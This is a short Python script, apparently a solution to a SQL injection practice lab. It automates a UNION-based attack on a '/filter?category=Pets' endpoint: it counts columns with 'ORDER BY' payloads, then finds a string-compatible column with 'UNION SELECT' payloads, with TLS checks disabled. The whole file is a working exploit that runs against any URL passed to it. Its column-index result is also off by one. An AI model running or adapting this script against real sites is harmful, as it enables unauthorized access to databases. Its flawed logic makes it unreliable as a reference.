import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def exploit_payload(url):

    uri = "/filter?category=Pets"
    for i in range(1, 10):

        payload = f"'+order+by+{i}--"
        r = requests.get(url+uri+payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i-1
        i = i+1
    return False


def exploit_payload_string_field(url, num_cols):
    uri = "/filter?category=Pets"
    for i in range(1, num_cols+1):
        string = 'Yx9qIO'
        payload_list = ['NULL']*num_cols
        payload_list[i-1] = string
        sql_payload = "' UNION SELECT "+",".join(payload_list)+'--'
        r = requests.get(url+uri+sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i+1
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com \ and 1=1")
        sys.exit(-1)

    print("[+] Figuring out the number of columns...")
    num_cols = exploit_payload(url)
    if num_cols:
        print(f"[+] Number of columns: {num_cols}")
        print("[+] Figuring out the string field...")
        string_col = exploit_payload_string_field(url, num_cols)
        if string_col:
            print(f"[+] String field found at column {string_col}")
            print("[+] SQL Injection Successful...")
        else:
            print("[-] String field not found!")
    else:
        print('[-] failed')
